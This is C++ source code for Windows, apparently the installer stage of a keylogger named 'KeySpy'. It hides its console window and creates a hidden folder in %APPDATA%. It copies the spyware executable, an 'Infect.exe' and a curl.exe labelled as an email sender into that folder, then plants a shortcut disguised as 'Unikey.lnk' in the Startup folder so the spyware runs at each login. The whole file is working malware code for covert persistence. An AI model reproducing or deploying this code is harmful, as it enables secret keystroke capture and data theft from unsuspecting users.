#include <windows.h>
#include <string>
#include <time.h>
#include <iostream>

#define FOLDER_NAME "KeySpy"              /// containing folder
#define RUN_FILE_NAME "KeySpy.exe"        /// main run file
#define RUN_LINK_NAME "KeySpy.lnk"        /// starter link
#define INFECT_FILE_NAME "Infect.exe"     /// infects computer
#define INFECT_LINK_NAME "Infect.lnk"     /// link file
#define EMAIL_SENDER_FILE_NAME "curl.exe" /// email sender

std::string GetExecutePath()
{
    char result[MAX_PATH];
    return std::string(result, GetModuleFileName(NULL, result, MAX_PATH));
}

int main()
{
    std::string exePath = GetExecutePath();
    std::string currentDirectory = exePath.substr(0, exePath.length() - 10);
    SetCurrentDirectory(currentDirectory.c_str());
    // std::cout << currentDirectory << std::endl;
    // system("pause");

    FreeConsole(); /// Window is not visible

    char *appdataFolder = getenv("APPDATA"); // %AppData%

    char folderPath[100] = {""};
    strcat(folderPath, appdataFolder);
    strcat(folderPath, "\\");
    strcat(folderPath, FOLDER_NAME);

    if (CreateDirectory(folderPath, NULL))
    {
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN); // Hidden the Spyware Folder

        /* Copy the RUN_FILE_NAME */
        char run[100] = {""};
        strcat(run, folderPath);
        strcat(run, "\\");
        strcat(run, RUN_FILE_NAME);

        char run_from[100] = {""};
        strcat(run_from, RUN_FILE_NAME);

        CopyFile(run_from, run, 0);

        /* Copy the EMAIL_SENDER_FILE_NAME */
        char net[100] = {""};
        strcat(net, folderPath);
        strcat(net, "\\");
        strcat(net, EMAIL_SENDER_FILE_NAME);

        char net_from[100] = {""};
        strcat(net_from, EMAIL_SENDER_FILE_NAME);

        CopyFile(net_from, net, 0);

        /* Copy the INFECT_FILE_NAME */
        char infect[100] = {""};
        strcat(infect, folderPath);
        strcat(infect, "\\");
        strcat(infect, INFECT_FILE_NAME);

        char infect_from[100] = {""};
        strcat(infect_from, INFECT_FILE_NAME);

        CopyFile(infect_from, infect, 0);

        /* Copy the RUN_LINK_NAME */
        char runlnk[100] = {""};
        strcat(runlnk, folderPath);
        strcat(runlnk, "\\");
        strcat(runlnk, RUN_LINK_NAME);

        char runlnk_from[100] = {""};
        strcat(runlnk_from, RUN_LINK_NAME);

        CopyFile(runlnk_from, runlnk, 0);

        /* Copy the INFECT_LINK_NAME */
        char infectlnk[100] = {""};
        strcat(infectlnk, folderPath);
        strcat(infectlnk, "\\");
        strcat(infectlnk, INFECT_LINK_NAME);

        char infectlnk_from[100] = {""};
        strcat(infectlnk_from, INFECT_LINK_NAME);

        CopyFile(infectlnk_from, infectlnk, 0);

        /* Copy to the StartUp Folder */
        char tasklnkauto[100] = {""};
        strcat(tasklnkauto, appdataFolder);
        strcat(tasklnkauto, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Unikey.lnk");

        CopyFile(runlnk_from, tasklnkauto, 0);
    }
}
